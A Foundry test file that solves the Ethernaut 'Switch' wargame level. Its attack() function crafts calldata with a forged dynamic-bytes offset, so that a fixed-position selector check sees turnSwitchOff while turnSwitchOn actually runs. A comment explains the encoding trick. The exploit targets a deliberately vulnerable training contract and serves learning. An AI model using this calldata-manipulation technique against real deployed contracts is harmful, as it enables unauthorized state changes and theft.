// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Switch} from "ethernaut/levels/Switch.sol";

contract SwitchTest is Test {
    Switch target;
    address player;

    function setUp() public {
        player = makeAddr("player");

        target = new Switch();
    }

    /**
     * We need to use `flipSwitch` as the main selector, and provide a call to
     * `turnSwitchOn` within its data, with another selector for `turnSwitchOff`
     * at the slot 68 (0x44).
     *
     * Since `bytes` is a dynamic type, its calldata is encoded as:
     * - [x]                        offset (32 bytes)
     * - [offset]                   length (32 bytes)
     * - [offset+1:offset+length+1] values (length * bytes)
     *
     * In the case of `flipSwitch`, that `x` is simply 4, because bytes [0,1,2,3] are
     * used for the function selector. Note that this is what happens when you call
     *
     * - target.flipSwitch(bytes.concat(Switch.turnSwitchOff.selector));
     *
     * We can instead fabricate our own bytes array.
     */
    function attack() private {
        bytes memory data = abi.encode(
            uint256(0x60), // sets array offset to our desired location
            uint256(0x00), // ignored, can be all zeros; would be 4 normally
            Switch.turnSwitchOff.selector, // checked by `onlyOff` in assembly
            uint256(0x04), // offset points here as length, 4 bytes
            Switch.turnSwitchOn.selector // actual value in 4 bytes
        );

        (bool ok,) = address(target).call(bytes.concat(Switch.flipSwitch.selector, data));
        require(ok, "failed call");
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertTrue(target.switchOn(), "switch must be on");
    }
}
